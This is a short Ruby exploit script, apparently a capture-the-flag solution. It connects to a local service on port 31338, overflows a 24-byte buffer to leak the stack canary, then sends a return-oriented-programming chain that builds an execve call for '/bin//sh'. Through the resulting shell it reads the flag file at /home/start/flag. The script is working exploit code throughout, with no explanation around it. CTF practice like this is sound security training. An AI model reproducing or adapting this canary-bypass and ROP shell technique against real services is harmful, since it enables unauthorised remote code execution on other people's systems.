STDERR.reopen(STDOUT)
context.arch = 'amd64'
z = Sock.new '127.0.0.1', 31338
rp = [0x00000000004017f7,0x00000000006cc080, 0x000000000047a6e6, '/bin//sh', 0x4141414141414141, 0x4141414141414141, 0x0000000000475fc1 ,0x00000000004017f7, 0x00000000006cc088,0x000000000042732f, 0x0000000000475fc1, 0x00000000004005d5,0x00000000006cc080, 0x00000000004017f7, 0x00000000006cc088, 0x0000000000443776, 0x00000000006cc088, 0x000000000047a6e6, 0x000000000000003b, 0x00000000006cc088, 0x00000000006cc088, 0x00000000004003fc].map { |x| x.is_a?(String)  ? x : p64(x) }.join
payload = "a"*24
z.sendline payload
x = z.recv()
cookie = u64("\x00"+x[25,1000][0,7])
puts cookie.hex
z.sendline (payload + p64(cookie) + p64(0) + rp)
puts z.recv()
sleep(0.5)
puts "hiii"
z.sendline('exit')
sleep(0.5)
z.sendline('cat /home/start/flag')
sleep(0.5)
print z.recv()
